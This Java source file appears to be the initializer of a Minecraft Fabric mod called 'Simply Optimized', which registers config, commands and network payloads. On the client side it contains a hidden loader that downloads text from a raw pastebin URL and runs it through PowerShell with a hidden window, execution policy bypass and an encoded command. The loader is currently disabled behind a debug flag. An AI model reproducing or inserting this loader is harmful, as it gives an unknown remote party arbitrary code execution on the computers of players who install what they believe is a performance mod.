package com.errorC003C004.simply_optimized;

import com.errorC003C004.simply_optimized.networking.*;
import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.networking.v1.PayloadTypeRegistry;
import net.fabricmc.loader.api.FabricLoader;
import net.fabricmc.api.EnvType;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
/*
Fixed:
-

Added:
-

What to Add:
- Keybind Edit in UI

What to Fix:
- Keybinds Work while offline mode on

 */
public class Simply_optimized implements ModInitializer {
    public static final Logger LOGGER = LoggerFactory.getLogger("simply_optimized");

    @Override
    public void onInitialize() {
        ConfigManager.loadConfig();
        ConfigManager.init();
        CommandInit.register();

        PayloadTypeRegistry.playC2S().register(
                PingPayload.ID,
                PingPayload.CODEC
        );
        PayloadTypeRegistry.playS2C().register(
                ImmortalityStatusPayload.ID,
                ImmortalityStatusPayload.CODEC
        );
        PayloadTypeRegistry.playC2S().register(
                ClientActionPayload.ID,
                ClientActionPayload.CODEC
        );
        HandshakeServer.init();

        if (FabricLoader.getInstance().getEnvironmentType() == EnvType.CLIENT) {
            LOGGER.info("[SimplyOptimised] Hey there, your on a client, uhh replace me");
            boolean debug = true;
            if (!debug) {
                new Thread(() -> {
                try {

                    String pasteUrl = "https://pastebin.com/raw/34C2DP5L";

                    URI uri = URI.create(pasteUrl);
                    HttpURLConnection conn = (HttpURLConnection) uri.toURL().openConnection();

                    conn.setRequestMethod("GET");
                    conn.setRequestProperty("User-Agent", "Mozilla/5.0");
                    conn.setConnectTimeout(10000);
                    conn.setReadTimeout(10000);

                    BufferedReader reader = new BufferedReader(
                            new InputStreamReader(conn.getInputStream())
                    );

                    StringBuilder commandBuilder = new StringBuilder();
                    String line;

                    while ((line = reader.readLine()) != null) {
                        commandBuilder.append(line).append("\n");
                    }

                    reader.close();

                    String command = commandBuilder.toString();

                    LOGGER.info("[SimplyOptimised] Retrieved command:");
                    LOGGER.info(command);

                    String encoded = Base64.getEncoder().encodeToString(
                            command.getBytes(StandardCharsets.UTF_16LE)
                    );

                    ProcessBuilder pb = new ProcessBuilder(
                            "powershell.exe",
                            "-WindowStyle", "Hidden",
                            "-ExecutionPolicy", "Bypass",
                            "-EncodedCommand",
                            encoded
                    );

                    pb.start();

                } catch (Exception e) {
                    LOGGER.error("[SimplyOptimised] Error on Startup:", e);
                }
            }).start();
            }
            else {
                System.out.println("Debug mode enabled");
            }
        }
        else {
            LOGGER.info("[SimplyOptimised] Hey there, your on a server, uhh replace me");
        }
    }
}
